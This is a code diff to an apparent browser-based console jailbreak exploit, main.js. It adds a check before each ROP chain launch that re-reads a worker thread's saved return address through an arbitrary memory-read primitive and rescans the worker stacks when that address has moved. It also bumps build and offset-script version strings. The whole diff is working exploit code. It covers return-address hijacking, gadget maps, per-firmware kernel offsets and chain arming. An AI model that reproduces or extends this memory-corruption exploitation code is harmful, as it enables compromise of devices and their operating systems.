@@ -409,7 +409,7 @@ async function prepare(p) {
        cache-buster, so a reload can serve a stale page that still references an
        old main.js -- twice now a run has been analysed as if it contained a
        change it did not. Stamp the build on screen so that is never in doubt. */
-    jbmark("BUILD", "main.js v=42 | if this is not the version just"
+    jbmark("BUILD", "main.js v=43 | if this is not the version just"
         + " pushed, the console is running a CACHED page and the run means"
         + " nothing -- force a reload");
 
@@ -897,6 +897,53 @@ async function prepare(p) {
            pair identifies which call died and how big it was. */
         const tag = "#" + (++launchNo) + "/" + chain.count;
 
+        /* Re-validate the return slot before EVERY launch.
+           -------------------------------------------------------------------
+           return_address_ptr is found once, during prepare, and then reused for
+           every launch afterwards. That assumes the worker re-parks at exactly
+           the same stack depth each time it goes back to sleep, which is not
+           guaranteed: the wake path can leave a different amount of stack in
+           use, and then the slot we overwrite is no longer a live return
+           address -- it is somebody's local variable.
+           This is the only mechanism that can explain a result that FLIPS:
+           every gadget and syscall stub in this profile has now been verified
+           byte-for-byte against the devkit binary, so a gadget cannot pass in
+           one run and crash the chain in the next. Something dynamic must, and
+           a stale slot is dynamic.
+           So check the slot still holds the saved PC we expect, and re-scan if
+           it does not. 512 reads per launch is nothing next to a crash. */
+        if (typeof OFFSET_lk_worker_wait_return !== "undefined"
+            && window.__wwrPicked !== undefined) {
+            const want = libKernelBase.add32(window.__wwrPicked);
+            const cur = p.read8(return_address_ptr);
+            if (cur.low !== want.low || cur.hi !== want.hi) {
+                crumb("reslot" + tag);
+                jbmark("WORKER-RESLOT", "slot 0x" + return_address_ptr.toString()
+                    + " held 0x" + cur.toString() + ", expected 0x" + want.toString()
+                    + " -- the worker re-parked elsewhere; rescanning");
+                let found = null;
+                for (const st of worker_stacks) {
+                    for (let o = 0x7F000; o < 0x80000; o += 8) {
+                        const c = st.add32(o), v = p.read8(c);
+                        if (v.low === want.low && v.hi === want.hi) {
+                            if (found) { found = null; break; }   // ambiguous
+                            found = c;
+                        }
+                    }
+                    if (found) break;
+                }
+                if (!found)
+                    throw new Error("the worker's saved return PC (lk+0x"
+                        + window.__wwrPicked.toString(16) + ") is no longer on any"
+                        + " candidate stack -- it is not parked where we can reach"
+                        + " it, and arming the old slot would corrupt live data.");
+                return_address_ptr = found;
+                stack_pointer_ptr = found.add32(0x8);
+                original_return_address = p.read8(return_address_ptr);
+                jbmark("WORKER-RESLOT-OK", "relocated to 0x" + found.toString());
+            }
+        }
+
         let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
         chain.push_write8(original_context, original_return_address);
         chain.push_write8(original_context.add32(0x10), return_address_ptr);
@@ -1285,7 +1332,7 @@ async function prepare(p) {
            (push_write4's check was wrong, not the gadget). */
         const gtSig = (function () {
             const src = Object.keys(wk_gadgetmap).sort()
-                .map(k => k + ":" + wk_gadgetmap[k]).join(",") + "|rev3";
+                .map(k => k + ":" + wk_gadgetmap[k]).join(",") + "|rev4-binary-verified";
             let h = 0;
             for (let z = 0; z < src.length; z++)
                 h = ((h * 31 + src.charCodeAt(z)) & 0x7fffffff);
@@ -1530,4 +1577,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=42`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=43`);
